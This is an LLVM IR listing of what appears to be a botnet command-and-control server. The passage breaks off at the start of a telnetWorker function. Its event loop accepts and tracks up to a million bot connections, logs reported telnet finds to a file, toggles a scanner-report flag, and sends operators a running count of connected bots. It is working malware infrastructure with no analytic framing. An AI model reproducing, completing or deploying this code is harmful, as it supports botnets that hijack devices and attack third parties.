declare i8* @asctime(%struct.tm*) #3

declare i64 @send(i32, i8*, i64, i32) #1

; Function Attrs: nounwind
declare void @free(i8*) #3

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i8* @epollEventLoop(i8* %0) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca %struct.epoll_event, align 1
  %4 = alloca %struct.epoll_event*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca %struct.sockaddr, align 2
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca %struct.clientdata_t*, align 8
  %15 = alloca i32, align 4
  %16 = alloca i64, align 8
  %17 = alloca [2048 x i8], align 16
  %18 = alloca i8*, align 8
  %19 = alloca i8*, align 8
  %20 = alloca i8*, align 8
  store i8* %0, i8** %2, align 8
  %21 = call noalias align 16 i8* @calloc(i64 1000000, i64 12) #9
  %22 = bitcast i8* %21 to %struct.epoll_event*
  store %struct.epoll_event* %22, %struct.epoll_event** %4, align 8
  br label %23

23:                                               ; preds = %1, %334
  %24 = load volatile i32, i32* @epollFD, align 4
  %25 = load %struct.epoll_event*, %struct.epoll_event** %4, align 8
  %26 = call i32 @epoll_wait(i32 %24, %struct.epoll_event* %25, i32 1000000, i32 -1)
  store i32 %26, i32* %6, align 4
  store i32 0, i32* %7, align 4
  br label %27

27:                                               ; preds = %331, %23
  %28 = load i32, i32* %7, align 4
  %29 = load i32, i32* %6, align 4
  %30 = icmp slt i32 %28, %29
  br i1 %30, label %31, label %334

31:                                               ; preds = %27
  %32 = load %struct.epoll_event*, %struct.epoll_event** %4, align 8
  %33 = load i32, i32* %7, align 4
  %34 = sext i32 %33 to i64
  %35 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %32, i64 %34
  %36 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %35, i32 0, i32 0
  %37 = load i32, i32* %36, align 1
  %38 = and i32 %37, 8
  %39 = icmp ne i32 %38, 0
  br i1 %39, label %58, label %40

40:                                               ; preds = %31
  %41 = load %struct.epoll_event*, %struct.epoll_event** %4, align 8
  %42 = load i32, i32* %7, align 4
  %43 = sext i32 %42 to i64
  %44 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %41, i64 %43
  %45 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %44, i32 0, i32 0
  %46 = load i32, i32* %45, align 1
  %47 = and i32 %46, 16
  %48 = icmp ne i32 %47, 0
  br i1 %48, label %58, label %49

49:                                               ; preds = %40
  %50 = load %struct.epoll_event*, %struct.epoll_event** %4, align 8
  %51 = load i32, i32* %7, align 4
  %52 = sext i32 %51 to i64
  %53 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %50, i64 %52
  %54 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %53, i32 0, i32 0
  %55 = load i32, i32* %54, align 1
  %56 = and i32 %55, 1
  %57 = icmp ne i32 %56, 0
  br i1 %57, label %77, label %58

58:                                               ; preds = %49, %40, %31
  %59 = load %struct.epoll_event*, %struct.epoll_event** %4, align 8
  %60 = load i32, i32* %7, align 4
  %61 = sext i32 %60 to i64
  %62 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %59, i64 %61
  %63 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %62, i32 0, i32 1
  %64 = bitcast %union.epoll_data* %63 to i32*
  %65 = load i32, i32* %64, align 1
  %66 = sext i32 %65 to i64
  %67 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %66
  %68 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %67, i32 0, i32 2
  store i8 0, i8* %68, align 1
  %69 = load %struct.epoll_event*, %struct.epoll_event** %4, align 8
  %70 = load i32, i32* %7, align 4
  %71 = sext i32 %70 to i64
  %72 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %69, i64 %71
  %73 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %72, i32 0, i32 1
  %74 = bitcast %union.epoll_data* %73 to i32*
  %75 = load i32, i32* %74, align 1
  %76 = call i32 @close(i32 %75)
  br label %331

77:                                               ; preds = %49
  %78 = load volatile i32, i32* @listenFD, align 4
  %79 = load %struct.epoll_event*, %struct.epoll_event** %4, align 8
  %80 = load i32, i32* %7, align 4
  %81 = sext i32 %80 to i64
  %82 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %79, i64 %81
  %83 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %82, i32 0, i32 1
  %84 = bitcast %union.epoll_data* %83 to i32*
  %85 = load i32, i32* %84, align 1
  %86 = icmp eq i32 %78, %85
  br i1 %86, label %87, label %223

87:                                               ; preds = %77
  br label %88

88:                                               ; preds = %87, %151, %158, %165, %172, %179, %186, %189, %213
  store i32 16, i32* %9, align 4
  %89 = load volatile i32, i32* @listenFD, align 4
  %90 = call i32 @accept(i32 %89, %struct.sockaddr* %8, i32* %9)
  store i32 %90, i32* %10, align 4
  %91 = load i32, i32* %10, align 4
  %92 = icmp eq i32 %91, -1
  br i1 %92, label %93, label %103

93:                                               ; preds = %88
  %94 = call i32* @__errno_location() #10
  %95 = load i32, i32* %94, align 4
  %96 = icmp eq i32 %95, 11
  br i1 %96, label %101, label %97

97:                                               ; preds = %93
  %98 = call i32* @__errno_location() #10
  %99 = load i32, i32* %98, align 4
  %100 = icmp eq i32 %99, 11
  br i1 %100, label %101, label %102

101:                                              ; preds = %97, %93
  br label %222

102:                                              ; preds = %97
  call void @perror(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.5, i64 0, i64 0))
  br label %222

103:                                              ; preds = %88
  %104 = bitcast %struct.sockaddr* %8 to %struct.sockaddr_in*
  %105 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %104, i32 0, i32 2
  %106 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %105, i32 0, i32 0
  %107 = load i32, i32* %106, align 2
  %108 = load i32, i32* %10, align 4
  %109 = sext i32 %108 to i64
  %110 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %109
  %111 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %110, i32 0, i32 0
  store i32 %107, i32* %111, align 4
  store i32 0, i32* %12, align 4
  store i32 0, i32* %11, align 4
  br label %112

112:                                              ; preds = %141, %103
  %113 = load i32, i32* %11, align 4
  %114 = icmp slt i32 %113, 1000000
  br i1 %114, label %115, label %144

115:                                              ; preds = %112
  %116 = load i32, i32* %11, align 4
  %117 = sext i32 %116 to i64
  %118 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %117
  %119 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %118, i32 0, i32 2
  %120 = load i8, i8* %119, align 1
  %121 = icmp ne i8 %120, 0
  br i1 %121, label %122, label %126

122:                                              ; preds = %115
  %123 = load i32, i32* %11, align 4
  %124 = load i32, i32* %10, align 4
  %125 = icmp eq i32 %123, %124
  br i1 %125, label %126, label %127

126:                                              ; preds = %122, %115
  br label %141

127:                                              ; preds = %122
  %128 = load i32, i32* %11, align 4
  %129 = sext i32 %128 to i64
  %130 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %129
  %131 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %130, i32 0, i32 0
  %132 = load i32, i32* %131, align 4
  %133 = load i32, i32* %10, align 4
  %134 = sext i32 %133 to i64
  %135 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %134
  %136 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %135, i32 0, i32 0
  %137 = load i32, i32* %136, align 4
  %138 = icmp eq i32 %132, %137
  br i1 %138, label %139, label %140

139:                                              ; preds = %127
  store i32 1, i32* %12, align 4
  br label %144

140:                                              ; preds = %127
  br label %141

141:                                              ; preds = %140, %126
  %142 = load i32, i32* %11, align 4
  %143 = add nsw i32 %142, 1
  store i32 %143, i32* %11, align 4
  br label %112, !llvm.loop !12

144:                                              ; preds = %139, %112
  %145 = load i32, i32* %12, align 4
  %146 = icmp ne i32 %145, 0
  br i1 %146, label %147, label %192

147:                                              ; preds = %144
  %148 = load i32, i32* %10, align 4
  %149 = call i64 @send(i32 %148, i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.6, i64 0, i64 0), i64 11, i32 16384)
  %150 = icmp eq i64 %149, -1
  br i1 %150, label %151, label %154

151:                                              ; preds = %147
  %152 = load i32, i32* %10, align 4
  %153 = call i32 @close(i32 %152)
  br label %88

154:                                              ; preds = %147
  %155 = load i32, i32* %10, align 4
  %156 = call i64 @send(i32 %155, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.7, i64 0, i64 0), i64 11, i32 16384)
  %157 = icmp eq i64 %156, -1
  br i1 %157, label %158, label %161

158:                                              ; preds = %154
  %159 = load i32, i32* %10, align 4
  %160 = call i32 @close(i32 %159)
  br label %88

161:                                              ; preds = %154
  %162 = load i32, i32* %10, align 4
  %163 = call i64 @send(i32 %162, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.8, i64 0, i64 0), i64 11, i32 16384)
  %164 = icmp eq i64 %163, -1
  br i1 %164, label %165, label %168

165:                                              ; preds = %161
  %166 = load i32, i32* %10, align 4
  %167 = call i32 @close(i32 %166)
  br label %88

168:                                              ; preds = %161
  %169 = load i32, i32* %10, align 4
  %170 = call i64 @send(i32 %169, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.9, i64 0, i64 0), i64 11, i32 16384)
  %171 = icmp eq i64 %170, -1
  br i1 %171, label %172, label %175

172:                                              ; preds = %168
  %173 = load i32, i32* %10, align 4
  %174 = call i32 @close(i32 %173)
  br label %88

175:                                              ; preds = %168
  %176 = load i32, i32* %10, align 4
  %177 = call i64 @send(i32 %176, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.10, i64 0, i64 0), i64 11, i32 16384)
  %178 = icmp eq i64 %177, -1
  br i1 %178, label %179, label %182

179:                                              ; preds = %175
  %180 = load i32, i32* %10, align 4
  %181 = call i32 @close(i32 %180)
  br label %88

182:                                              ; preds = %175
  %183 = load i32, i32* %10, align 4
  %184 = call i64 @send(i32 %183, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.11, i64 0, i64 0), i64 11, i32 16384)
  %185 = icmp eq i64 %184, -1
  br i1 %185, label %186, label %189

186:                                              ; preds = %182
  %187 = load i32, i32* %10, align 4
  %188 = call i32 @close(i32 %187)
  br label %88

189:                                              ; preds = %182
  %190 = load i32, i32* %10, align 4
  %191 = call i32 @close(i32 %190)
  br label %88

192:                                              ; preds = %144
  %193 = load i32, i32* %10, align 4
  %194 = call i32 @make_socket_non_blocking(i32 %193)
  store i32 %194, i32* %5, align 4
  %195 = load i32, i32* %5, align 4
  %196 = icmp eq i32 %195, -1
  br i1 %196, label %197, label %200

197:                                              ; preds = %192
  %198 = load i32, i32* %10, align 4
  %199 = call i32 @close(i32 %198)
  br label %222

200:                                              ; preds = %192
  %201 = load i32, i32* %10, align 4
  %202 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %3, i32 0, i32 1
  %203 = bitcast %union.epoll_data* %202 to i32*
  store i32 %201, i32* %203, align 1
  %204 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %3, i32 0, i32 0
  store i32 -2147483647, i32* %204, align 1
  %205 = load volatile i32, i32* @epollFD, align 4
  %206 = load i32, i32* %10, align 4
  %207 = call i32 @epoll_ctl(i32 %205, i32 1, i32 %206, %struct.epoll_event* %3) #9
  store i32 %207, i32* %5, align 4
  %208 = load i32, i32* %5, align 4
  %209 = icmp eq i32 %208, -1
  br i1 %209, label %210, label %213

210:                                              ; preds = %200
  call void @perror(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.12, i64 0, i64 0))
  %211 = load i32, i32* %10, align 4
  %212 = call i32 @close(i32 %211)
  br label %222

213:                                              ; preds = %200
  %214 = load i32, i32* %10, align 4
  %215 = sext i32 %214 to i64
  %216 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %215
  %217 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %216, i32 0, i32 2
  store i8 1, i8* %217, align 1
  %218 = load i32, i32* %10, align 4
  %219 = call i64 @send(i32 %218, i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.13, i64 0, i64 0), i64 14, i32 16384)
  %220 = load i32, i32* %10, align 4
  %221 = call i64 @send(i32 %220, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.14, i64 0, i64 0), i64 11, i32 16384)
  br label %88

222:                                              ; preds = %210, %197, %102, %101
  br label %331

223:                                              ; preds = %77
  %224 = load %struct.epoll_event*, %struct.epoll_event** %4, align 8
  %225 = load i32, i32* %7, align 4
  %226 = sext i32 %225 to i64
  %227 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %224, i64 %226
  %228 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %227, i32 0, i32 1
  %229 = bitcast %union.epoll_data* %228 to i32*
  %230 = load i32, i32* %229, align 1
  store i32 %230, i32* %13, align 4
  %231 = load i32, i32* %13, align 4
  %232 = sext i32 %231 to i64
  %233 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %232
  store %struct.clientdata_t* %233, %struct.clientdata_t** %14, align 8
  store i32 0, i32* %15, align 4
  %234 = load %struct.clientdata_t*, %struct.clientdata_t** %14, align 8
  %235 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %234, i32 0, i32 2
  store i8 1, i8* %235, align 1
  br label %236

236:                                              ; preds = %223, %319
  %237 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 16 %237, i8 0, i64 2048, i1 false)
  br label %238

238:                                              ; preds = %302, %301, %294, %286, %270, %264, %236
  %239 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 16 %239, i8 0, i64 2048, i1 false)
  %240 = icmp ne i8* %239, null
  br i1 %240, label %241, label %247

241:                                              ; preds = %238
  %242 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %243 = load i32, i32* %13, align 4
  %244 = call i32 @fdgets(i8* %242, i32 2048, i32 %243)
  %245 = sext i32 %244 to i64
  store i64 %245, i64* %16, align 8
  %246 = icmp sgt i64 %245, 0
  br label %247

247:                                              ; preds = %241, %238
  %248 = phi i1 [ false, %238 ], [ %246, %241 ]
  br i1 %248, label %249, label %305

249:                                              ; preds = %247
  %250 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %251 = call i8* @strstr(i8* %250, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.4, i64 0, i64 0)) #8
  %252 = icmp eq i8* %251, null
  br i1 %252, label %253, label %254

253:                                              ; preds = %249
  store i32 1, i32* %15, align 4
  br label %305

254:                                              ; preds = %249
  %255 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  call void @trim(i8* %255)
  %256 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %257 = call i32 @strcmp(i8* %256, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str, i64 0, i64 0)) #8
  %258 = icmp eq i32 %257, 0
  br i1 %258, label %259, label %265

259:                                              ; preds = %254
  %260 = load i32, i32* %13, align 4
  %261 = call i64 @send(i32 %260, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.15, i64 0, i64 0), i64 5, i32 16384)
  %262 = icmp eq i64 %261, -1
  br i1 %262, label %263, label %264

263:                                              ; preds = %259
  store i32 1, i32* %15, align 4
  br label %305

264:                                              ; preds = %259
  br label %238, !llvm.loop !13

265:                                              ; preds = %254
  %266 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %267 = call i8* @strstr(i8* %266, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.16, i64 0, i64 0)) #8
  %268 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %269 = icmp eq i8* %267, %268
  br i1 %269, label %270, label %281

270:                                              ; preds = %265
  %271 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %272 = call i8* @strstr(i8* %271, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.16, i64 0, i64 0)) #8
  %273 = getelementptr inbounds i8, i8* %272, i64 7
  store i8* %273, i8** %18, align 8
  %274 = load %struct._IO_FILE*, %struct._IO_FILE** @telFD, align 8
  %275 = load i8*, i8** %18, align 8
  %276 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %274, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.17, i64 0, i64 0), i8* %275)
  %277 = load %struct._IO_FILE*, %struct._IO_FILE** @telFD, align 8
  %278 = call i32 @fflush(%struct._IO_FILE* %277)
  %279 = load volatile i32, i32* @TELFound, align 4
  %280 = add nsw i32 %279, 1
  store volatile i32 %280, i32* @TELFound, align 4
  br label %238, !llvm.loop !13

281:                                              ; preds = %265
  %282 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %283 = call i8* @strstr(i8* %282, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.18, i64 0, i64 0)) #8
  %284 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %285 = icmp eq i8* %283, %284
  br i1 %285, label %286, label %289

286:                                              ; preds = %281
  %287 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %288 = call i8* @strstr(i8* %287, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.18, i64 0, i64 0)) #8
  store i8* %288, i8** %19, align 8
  store volatile i32 1, i32* @scannerreport, align 4
  br label %238, !llvm.loop !13

289:                                              ; preds = %281
  %290 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %291 = call i8* @strstr(i8* %290, i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.19, i64 0, i64 0)) #8
  %292 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %293 = icmp eq i8* %291, %292
  br i1 %293, label %294, label %297

294:                                              ; preds = %289
  %295 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %296 = call i8* @strstr(i8* %295, i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.19, i64 0, i64 0)) #8
  store i8* %296, i8** %20, align 8
  store volatile i32 0, i32* @scannerreport, align 4
  br label %238, !llvm.loop !13

297:                                              ; preds = %289
  %298 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %299 = call i32 @strcmp(i8* %298, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i64 0, i64 0)) #8
  %300 = icmp eq i32 %299, 0
  br i1 %300, label %301, label %302

301:                                              ; preds = %297
  br label %238, !llvm.loop !13

302:                                              ; preds = %297
  %303 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %304 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.21, i64 0, i64 0), i8* %303)
  br label %238, !llvm.loop !13

305:                                              ; preds = %263, %253, %247
  %306 = load i64, i64* %16, align 8
  %307 = icmp eq i64 %306, -1
  br i1 %307, label %308, label %314

308:                                              ; preds = %305
  %309 = call i32* @__errno_location() #10
  %310 = load i32, i32* %309, align 4
  %311 = icmp ne i32 %310, 11
  br i1 %311, label %312, label %313

312:                                              ; preds = %308
  store i32 1, i32* %15, align 4
  br label %313

313:                                              ; preds = %312, %308
  br label %320

314:                                              ; preds = %305
  %315 = load i64, i64* %16, align 8
  %316 = icmp eq i64 %315, 0
  br i1 %316, label %317, label %318

317:                                              ; preds = %314
  store i32 1, i32* %15, align 4
  br label %320

318:                                              ; preds = %314
  br label %319

319:                                              ; preds = %318
  br label %236

320:                                              ; preds = %317, %313
  %321 = load i32, i32* %15, align 4
  %322 = icmp ne i32 %321, 0
  br i1 %322, label %323, label %328

323:                                              ; preds = %320
  %324 = load %struct.clientdata_t*, %struct.clientdata_t** %14, align 8
  %325 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %324, i32 0, i32 2
  store i8 0, i8* %325, align 1
  %326 = load i32, i32* %13, align 4
  %327 = call i32 @close(i32 %326)
  br label %328

328:                                              ; preds = %323, %320
  br label %329

329:                                              ; preds = %328
  br label %330

330:                                              ; preds = %329
  br label %331

331:                                              ; preds = %330, %222, %58
  %332 = load i32, i32* %7, align 4
  %333 = add nsw i32 %332, 1
  store i32 %333, i32* %7, align 4
  br label %27, !llvm.loop !14

334:                                              ; preds = %27
  br label %23
}

; Function Attrs: nounwind
declare noalias align 16 i8* @calloc(i64, i64) #3

declare i32 @epoll_wait(i32, %struct.epoll_event*, i32, i32) #1

declare i32 @close(i32) #1

declare i32 @accept(i32, %struct.sockaddr*, i32*) #1

; Function Attrs: nounwind readnone willreturn
declare i32* @__errno_location() #5

declare void @perror(i8*) #1

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define internal i32 @make_socket_non_blocking(i32 %0) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store i32 %0, i32* %3, align 4
  %6 = load i32, i32* %3, align 4
  %7 = call i32 (i32, i32, ...) @fcntl(i32 %6, i32 3, i32 0)
  store i32 %7, i32* %4, align 4
  %8 = load i32, i32* %4, align 4
  %9 = icmp eq i32 %8, -1
  br i1 %9, label %10, label %11

10:                                               ; preds = %1
  call void @perror(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.148, i64 0, i64 0))
  store i32 -1, i32* %2, align 4
  br label %21

11:                                               ; preds = %1
  %12 = load i32, i32* %4, align 4
  %13 = or i32 %12, 2048
  store i32 %13, i32* %4, align 4
  %14 = load i32, i32* %3, align 4
  %15 = load i32, i32* %4, align 4
  %16 = call i32 (i32, i32, ...) @fcntl(i32 %14, i32 4, i32 %15)
  store i32 %16, i32* %5, align 4
  %17 = load i32, i32* %5, align 4
  %18 = icmp eq i32 %17, -1
  br i1 %18, label %19, label %20

19:                                               ; preds = %11
  call void @perror(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.148, i64 0, i64 0))
  store i32 -1, i32* %2, align 4
  br label %21

20:                                               ; preds = %11
  store i32 0, i32* %2, align 4
  br label %21

21:                                               ; preds = %20, %19, %10
  %22 = load i32, i32* %2, align 4
  ret i32 %22
}

; Function Attrs: nounwind
declare i32 @epoll_ctl(i32, i32, i32, %struct.epoll_event*) #3

; Function Attrs: nounwind readonly willreturn
declare i8* @strstr(i8*, i8*) #2

declare i32 @fprintf(%struct._IO_FILE*, i8*, ...) #1

declare i32 @fflush(%struct._IO_FILE*) #1

declare i32 @printf(i8*, ...) #1

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i32 @clientsConnected() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  store i32 0, i32* %1, align 4
  store i32 0, i32* %2, align 4
  store i32 0, i32* %1, align 4
  br label %3

3:                                                ; preds = %17, %0
  %4 = load i32, i32* %1, align 4
  %5 = icmp slt i32 %4, 1000000
  br i1 %5, label %6, label %20

6:                                                ; preds = %3
  %7 = load i32, i32* %1, align 4
  %8 = sext i32 %7 to i64
  %9 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %8
  %10 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %9, i32 0, i32 2
  %11 = load i8, i8* %10, align 1
  %12 = icmp ne i8 %11, 0
  br i1 %12, label %14, label %13

13:                                               ; preds = %6
  br label %17

14:                                               ; preds = %6
  %15 = load i32, i32* %2, align 4
  %16 = add nsw i32 %15, 1
  store i32 %16, i32* %2, align 4
  br label %17

17:                                               ; preds = %14, %13
  %18 = load i32, i32* %1, align 4
  %19 = add nsw i32 %18, 1
  store i32 %19, i32* %1, align 4
  br label %3, !llvm.loop !15

20:                                               ; preds = %3
  %21 = load i32, i32* %2, align 4
  ret i32 %21
}

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i8* @titleWriter(i8* %0) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i32, align 4
  %4 = alloca [2048 x i8], align 16
  store i8* %0, i8** %2, align 8
  %5 = load i8*, i8** %2, align 8
  %6 = ptrtoint i8* %5 to i32
  store i32 %6, i32* %3, align 4
  br label %7

7:                                                ; preds = %1, %20
  %8 = getelementptr inbounds [2048 x i8], [2048 x i8]* %4, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 16 %8, i8 0, i64 2048, i1 false)
  %9 = getelementptr inbounds [2048 x i8], [2048 x i8]* %4, i64 0, i64 0
  %10 = call i32 @clientsConnected()
  %11 = load volatile i32, i32* @managesConnected, align 4
  %12 = call i32 (i8*, i8*, ...) @sprintf(i8* %9, i8* getelementptr inbounds ([51 x i8], [51 x i8]* @.str.22, i64 0, i64 0), i32 27, i32 %10, i32 %11, i32 7) #9
  %13 = load i32, i32* %3, align 4
  %14 = getelementptr inbounds [2048 x i8], [2048 x i8]* %4, i64 0, i64 0
  %15 = getelementptr inbounds [2048 x i8], [2048 x i8]* %4, i64 0, i64 0
  %16 = call i64 @strlen(i8* %15) #8
  %17 = call i64 @send(i32 %13, i8* %14, i64 %16, i32 16384)
  %18 = icmp eq i64 %17, -1
  br i1 %18, label %19, label %20

19:                                               ; preds = %7
  ret i8* null

20:                                               ; preds = %7
  %21 = call i32 @sleep(i32 3)
  br label %7
}

; Function Attrs: nounwind
declare i32 @sprintf(i8*, i8*, ...) #3

declare i32 @sleep(i32) #1

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i32 @Search_in_File(i8* %0) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i8*, align 8
  %4 = alloca %struct._IO_FILE*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca [512 x i8], align 16
  store i8* %0, i8** %3, align 8
  store i32 0, i32* %5, align 4
  store i32 0, i32* %6, align 4
  store i32 0, i32* %7, align 4
  %9 = call noalias %struct._IO_FILE* @fopen(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.23, i64 0, i64 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.24, i64 0, i64 0))
  store %struct._IO_FILE* %9, %struct._IO_FILE** %4, align 8
  %10 = icmp eq %struct._IO_FILE* %9, null
  br i1 %10, label %11, label %12

11:                                               ; preds = %1
  store i32 -1, i32* %2, align 4
  br label %42

12:                                               ; preds = %1
  br label %13

13:                                               ; preds = %27, %12
  %14 = getelementptr inbounds [512 x i8], [512 x i8]* %8, i64 0, i64 0
  %15 = load %struct._IO_FILE*, %struct._IO_FILE** %4, align 8
  %16 = call i8* @fgets(i8* %14, i32 512, %struct._IO_FILE* %15)
  %17 = icmp ne i8* %16, null
  br i1 %17, label %18, label %30

18:                                               ; preds = %13
  %19 = getelementptr inbounds [512 x i8], [512 x i8]* %8, i64 0, i64 0
  %20 = load i8*, i8** %3, align 8
  %21 = call i8* @strstr(i8* %19, i8* %20) #8
  %22 = icmp ne i8* %21, null
  br i1 %22, label %23, label %27

23:                                               ; preds = %18
  %24 = load i32, i32* %6, align 4
  %25 = add nsw i32 %24, 1
  store i32 %25, i32* %6, align 4
  %26 = load i32, i32* %5, align 4
  store i32 %26, i32* %7, align 4
  br label %27

27:                                               ; preds = %23, %18
  %28 = load i32, i32* %5, align 4
  %29 = add nsw i32 %28, 1
  store i32 %29, i32* %5, align 4
  br label %13, !llvm.loop !16

30:                                               ; preds = %13
  %31 = load %struct._IO_FILE*, %struct._IO_FILE** %4, align 8
  %32 = icmp ne %struct._IO_FILE* %31, null
  br i1 %32, label %33, label %36

33:                                               ; preds = %30
  %34 = load %struct._IO_FILE*, %struct._IO_FILE** %4, align 8
  %35 = call i32 @fclose(%struct._IO_FILE* %34)
  br label %36

36:                                               ; preds = %33, %30
  %37 = load i32, i32* %6, align 4
  %38 = icmp eq i32 %37, 0
  br i1 %38, label %39, label %40

39:                                               ; preds = %36
  store i32 0, i32* %2, align 4
  br label %42

40:                                               ; preds = %36
  %41 = load i32, i32* %7, align 4
  store i32 %41, i32* %2, align 4
  br label %42

42:                                               ; preds = %40, %39, %11
  %43 = load i32, i32* %2, align 4
  ret i32 %43
}

declare noalias %struct._IO_FILE* @fopen(i8*, i8*) #1

declare i8* @fgets(i8*, i32, %struct._IO_FILE*) #1

declare i32 @fclose(%struct._IO_FILE*) #1

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i8* @telnetWorker(i8* %0) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i8*, align 8
  %4 = alloca [5000 x i8], align 16
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i64, align 8
  %8 = alloca [2048 x i8], align 16
  %9 = alloca [2048 x i8], align 16
  %10 = alloca i8*, align 8
  %11 = alloca i8*, align 8
  %12 = alloca i8*, align 8
  %13 = alloca [2048 x i8], align 16
